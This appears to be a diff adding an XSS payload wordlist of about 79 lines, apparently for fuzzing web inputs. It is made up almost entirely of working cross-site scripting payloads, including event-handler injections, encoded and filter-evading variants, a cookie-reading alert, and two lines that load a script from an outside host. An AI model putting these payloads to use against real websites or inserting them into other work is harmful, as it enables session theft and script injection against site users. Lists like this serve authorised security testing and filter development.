@@ -1,0 +1,79 @@
+}
+'+'';
+'>//\\,<'>">">"*"
+(
+)
+*['<!--']{}
+-->
+-->{}
+.
+//
+<!--
+<%
+=
+_
+document.xss=1
+<img src=1 onerror=document.xss=1>
+"><img src=1 onerror=document.xss=1>
+<svg onload=document.xss=1></svg>
+"><svg onload=document.xss=1></svg>
+1'"><img/src/onerror=.1|alert``>
+1script3document.vulnerable=true;1/script3
+1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>
+'1<svg onload=alert(1)>
+1<svg onload=alert(1)>
+1"><svg onload=alert(1)>
+%20%6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%31%29%3e
+>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>
+%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
+%22%3e%3cscript%3ealert('XSS')%3c/script%3e
+'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E
+%22;alert%28%27RVRSH3LL_XSS%29//
+%22><svg%20onload=confirm(1);>
+<<!--%23set var="x" value="svg onload=alert(1)"--><!--%23echo var="x"-->>
+<%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22);
+\74svg o\156load\75alert\501\51\76
+<%78 onxxx=1
+#92&#117&#114&#108&#40&#47&#47&#98&#117&#115&#105&
+</a>
+a(0)
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe
+a=alert,a(1)
+<abbr draggable="true" ondrag="alert(1)">test</abbr>
+<abbr draggable="true" ondragleave="alert(1)">test</abbr>
+ABC<div style="x:\xE3\x80\x80expression(javascript:alert(1)">DEF
+ABC<div style="x:\xEF\xBB\xBFexpression(javascript:alert(1)">DEF
++ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-
+<a class=bar href="http://www.example.org">www.example.org</a>
+<acronym draggable="true" ondrag="alert(1)">test</acronym>
+<acronym draggable="true" ondragstart="alert(1)">test</acronym>
+<acronym id=x tabindex=1 onactivate=alert(1)></acronym>
+<address oncontextmenu="alert(1)">test</address>
+<address oncopy="alert(1)" contenteditable>test</address>
+<address onmouseup="alert(1)">test</address>
+<a  href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click  Me</a>
+<;A HREF=";http://0102.0146.0007.00000223/";>;XSS<;/A>;
+<A HREF="http://0102.0146.0007.00000223/">XSS</A>
+<;A HREF=";http://1113982867/";>;XSS<;/A>;
+<A HREF="http://1113982867/">XSS</A>
+<a href="javascript\x00:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x3A:javascript:alert(1)" id="fuzzelement1">test</a>
+'-alert(1)-'
+'-alert(1)//
+'}alert(1);{'
+(alert)(1)
+‘)alert(1);//
+‘; alert(1);
+alert`1`
+'}alert(1)%0A{'
+*/alert(1)">'onload="/*<svg/1='
+`-alert(1)">'onload="`<svg/1='
+"`-alert(1)</script><script>`
+*/alert(1)</script><script>/*
+'-alert(1)-'<svg>
+\'-alert(1)//<svg>
+alert(2)
+alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>
+alert&#40;1&#41
+alert(document.cookie);
